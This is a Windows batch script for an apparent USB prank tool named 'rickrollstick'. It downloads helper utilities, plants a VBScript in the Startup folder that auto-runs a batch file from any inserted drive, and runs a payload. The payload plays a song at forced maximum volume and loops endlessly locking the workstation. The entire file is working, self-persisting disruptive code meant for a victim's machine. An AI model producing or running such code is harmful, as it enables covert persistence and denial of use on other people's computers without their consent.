@echo off

set NIRCMD_URL="https://www.nirsoft.net/utils/nircmd.zip"
set NIRCMD_HASH=9cc3c07ac4b98cfaa826d10a48888bf6
set CMDMP3_URL=https://github.com/jimlawless/cmdmp3/raw/refs/heads/master/bin/cmdmp3.zip
set CMDMP3_HASH=90fa7a10cce229c9f418384b8823500c

:main
if not exist "%userprofile%\rickrollstick" goto install
if not exist "%userprofile%\rickrollstick\nircmd.exe" goto install
if not exist "%userprofile%\rickrollstick\cmdmp3.exe" goto install
if not exist "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\rickrollsticklistener.vbs" goto install
if not exist "%userprofile%"\rickrollstick\maindrive.sys goto install


set /p maindrive=<"%userprofile%"\rickrollstick\maindrive.sys
start %userprofile%\rickrollstick\cmdmp3.exe %userprofile%\rickrollstick\song.mp3
%userprofile%\rickrollstick\nircmd.exe setsysvolume 65535
%userprofile%\rickrollstick\nircmd.exe mutesysvolume 0

:a
rundll32.exe user32.dll, LockWorkStation
rem %maindrive%roll\nircmd.exe setsysvolume 6553
rem %maindrive%roll\nircmd.exe setsysvolume 6553
%userprofile%\rickrollstick\nircmd.exe setsysvolume 65535
%userprofile%\rickrollstick\nircmd.exe mutesysvolume 0
goto a




:install
if exist "%userprofile%\rickrollstick" del "%userprofile%\rickrollstick" /f /q

for /f "skip=3 tokens=1" %%a in ('powershell -command "$PSVersionTable.PSVersion"') do set Major=%%a
if %Major% lss 3 goto updatepowershell

if exist %userprofile%\rickrollstick del %userprofile%\rickrollstick /q /f
if not exist %userprofile%\rickrollstick md %userprofile%\rickrollstick
echo %CD:~0,3%>%userprofile%\rickrollstick\maindrive.sys
set maindrive=%CD:~0,3%

set script="%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\rickrollsticklistener.vbs"

echo Set fso = CreateObject("Scripting.FileSystemObject") > %script%
echo Set shell = CreateObject("WScript.Shell") >> %script%
echo userProfilePath = shell.ExpandEnvironmentStrings("%USERPROFILE%") >> %script%
echo driveFilePath = userProfilePath ^& "\rickrollstick\maindrive.sys" >> %script%
echo Do While True >> %script%
echo     If fso.FileExists(driveFilePath) Then >> %script%
echo         Set driveFile = fso.OpenTextFile(driveFilePath, 1) >> %script%
echo         driveLetter = driveFile.ReadLine >> %script%
echo         driveFile.Close >> %script%
echo         filePath = driveLetter ^& "files\rickrollstick.bat" >> %script%
echo         If fso.FileExists(filePath) Then >> %script%
echo             shell.Run filePath >> %script%
echo             Do While fso.DriveExists(driveLetter) >> %script%
echo                 WScript.Sleep 1000 ' Sleep for 1 second before checking again >> %script%
echo             Loop >> %script%
echo             WScript.Sleep 5000 ' Sleep for 5 seconds before starting search again >> %script%
echo         End If >> %script%
echo     End If >> %script%
echo     WScript.Sleep 1000 ' Sleep for 1 second before checking again >> %script%
echo Loop >> %script%

:wgetinstall
echo Trying to download wget.exe (download Tool)
powershell Invoke-WebRequest https://eternallybored.org/misc/wget/1.19.4/32/wget.exe -OutFile "%userprofile%\rickrollstick\wget.exe"
if %errorlevel%==9009 bitsadmin /transfer "DownloadWgetrickrollstick" /PRIORITY HIGH "https://eternallybored.org/misc/wget/1.19.4/32/wget.exe" "%userprofile%\rickrollstick\wget.exe"
if %errorlevel%==9009 goto fail2
if not exist "%userprofile%\rickrollstick\wget.exe" goto wgetinstall

rem Generating MD5 Hash
echo Generating MD5 Hash
certutil -hashfile "%userprofile%\rickrollstick\wget.exe" MD5 | findstr /V ":" >"%userprofile%\rickrollstick\wgethash.sys"
rem  Writing Original Hash to file...
echo Writing Original Hash to file...
echo 3dadb6e2ece9c4b3e1e322e617658b60>"%userprofile%\rickrollstick\orginal_wgethash.sys"
fc "%userprofile%\rickrollstick\wgethash.sys" "%userprofile%\rickrollstick\orginal_wgethash.sys"
if %errorlevel%==0 goto nircmdinstall

set comefrom=nircmdinstall
echo MD5-Hash verification failed!
set /p remotehash=<"%userprofile%\rickrollstick\wgethash.sys"
echo Expected Hash: 3dadb6e2ece9c4b3e1e322e617658b60
echo Returned Hash: %remotehash%

:ask1
echo Do you want to ignore and continue? (y/n)
set /p opt=Opt: 
if %opt%==y goto %comefrom%
if %opt%==n goto fail1
goto ask1

:fail1
echo The Hash isn't the same. This could mean that the Provider replaced or edited the file	 or the servers are offline or you have no internet connection!
echo We will not continue this Programm. Press Any Key to exit!
pause
goto cancel

:fail2
echo It looks like you are using and very old version of windows or you havn't installed the newest type of powershell!
echo Please Donwload bitsadmin or update powershell!
pause
goto cancel

:nircmdinstall
if not exist "%userprofile%\rickrollstick\empty.sys" type nul>"%userprofile%\rickrollstick\empty.sys"
if not exist "%userprofile%\rickrollstick\wget.exe" goto wgetinstall
"%userprofile%\rickrollstick\wget.exe" %NIRCMD_URL% -O"%userprofile%\rickrollstick\nircmd.zip"
fc "%userprofile%\rickrollstick\empty.sys" "%userprofile%\rickrollstick\nircmd.zip"
if %errorlevel%==0 goto nircmdinstall 

powershell -Command "Expand-Archive \"%userprofile%\rickrollstick\nircmd.zip\" -DestinationPath \"%userprofile%\rickrollstick\""
if errorlevel 1 (
    set "comefrom1=nircmdinstall_unzipped"
    set "zipFile=%userprofile%\rickrollstick\nircmd.zip"
    goto unzip
)

:nircmdinstall_unzipped
del "%userprofile%\rickrollstick\nircmd.zip" /f /q
del "%userprofile%\rickrollstick\NirCmd.chm" /f /q
del "%userprofile%\rickrollstick\nircmdc.exe" /f /q

echo Generating MD5 Hash
certutil -hashfile "%userprofile%\rickrollstick\nircmd.exe" MD5 | findstr /V ":" >"%userprofile%\rickrollstick\nircmdhash.sys"
rem  Writing Original Hash to file...
echo Writing Original Hash to file...
echo %NIRCMD_HASH%>"%userprofile%\rickrollstick\orginal_nircmdhash.sys"
fc "%userprofile%\rickrollstick\nircmdhash.sys" "%userprofile%\rickrollstick\orginal_nircmdhash.sys"
if %errorlevel%==0 goto cmdmp3install

set comefrom=cmdmp3install
echo MD5-Hash verification failed!
set /p remotehash=<"%userprofile%\rickrollstick\nircmdhash.sys"
echo Expected Hash: %NIRCMD_HASH%
echo Returned Hash: %remotehash%
goto ask1



:cmdmp3install
if not exist "%userprofile%\rickrollstick\wget.exe" goto wgetinstall
"%userprofile%\rickrollstick\wget.exe" %CMDMP3_URL% -O"%userprofile%\rickrollstick\cmdmp3.zip"
fc "%userprofile%\rickrollstick\empty.sys" "%userprofile%\rickrollstick\cmdmp3.zip"
if %errorlevel%==0 goto cmdmp3install

powershell -Command "Expand-Archive \"%userprofile%\rickrollstick\cmdmp3.zip\" -DestinationPath \"%userprofile%\rickrollstick\""
if errorlevel 1 (
    set "comefrom1=cmdmp3_unzipped"
    set "zipFile=%userprofile%\rickrollstick\cmdmp3.zip"
    goto unzip
)

echo Generating MD5 Hash
certutil -hashfile "%userprofile%\rickrollstick\cmdmp3.exe" MD5 | findstr /V ":" >"%userprofile%\rickrollstick\cmdmp3hash.sys"
rem  Writing Original Hash to file...
echo Writing Original Hash to file...
echo %CMDMP3_HASH%>"%userprofile%\rickrollstick\orginal_cmdmp3hash.sys"
fc "%userprofile%\rickrollstick\cmdmp3hash.sys" "%userprofile%\rickrollstick\orginal_cmdmp3hash.sys"
if %errorlevel%==0 goto songinstall

set comefrom=main
echo MD5-Hash verification failed!
set /p remotehash=<"%userprofile%\rickrollstick\cmdmp3hash.sys"
echo Expected Hash: %CMDMP3_HASH%
echo Returned Hash: %remotehash%
goto ask1


:songinstall
copy %maindrive%files\song.mp3 "%userprofile%\rickrollstick\song.mp3"
goto main


:updatepowershell
cls 
echo your Major Powershell version is not supported.
echo Required version: 3
echo Your version: %Major%
echo Do you want to update it? (y/n)
set /p opt=Option: 
if %opt%==y goto updatepowershell_init
if %opt%==n goto cancel
goto updatepowershell
:updatepowershell_init
cls
echo Please download and install powershell from the link below:
echo https://learn.microsoft.com/en-us/powershell/scripting/install/installing-powershell-on-windows?view=powershell-7.3#installing-the-zip-package
echo Or just search "Powershell Download" in the internet (Don't download any Viruses!)
pause

:cancel
cls
echo We are not able to continue the installation.
echo Press any key to exit.
echo We will delete the entire progress until now.
del %userprofile%\rickrollstick /q /f
echo Deltetion success!
echo Press any key to exit.
pause
goto end

:unzip
set vbsFile=%userprofile%\rickrollstick\unzip1.vbs
set destination=%userprofile%\rickrollstick\

echo Set objFSO = CreateObject("Scripting.FileSystemObject"^)>%vbsFile%
echo strZipFile = "%zipFile%">>%vbsFile%
echo strDestination = "%destination%">>%vbsFile%
echo If objFSO.FolderExists(strDestination^) Then>>%vbsFile%
echo     Set objFolder = objFSO.GetFolder(strDestination^)>>%vbsFile%
echo Else>>%vbsFile%
echo     Set objFolder = objFSO.CreateFolder(strDestination^)>>%vbsFile%
echo End If>>%vbsFile%
echo With CreateObject("Shell.Application"^)>>%vbsFile%
echo     .Namespace(objFolder.Path^).CopyHere .Namespace(strZipFile^).Items>>%vbsFile%
echo End With>>%vbsFile%

cscript //nologo %vbsFile%
echo Unzip Error %errorlevel%
del "%userprofile%\rickrollstick\unzip1.vbs" /f /q
goto %comefrom1%

:end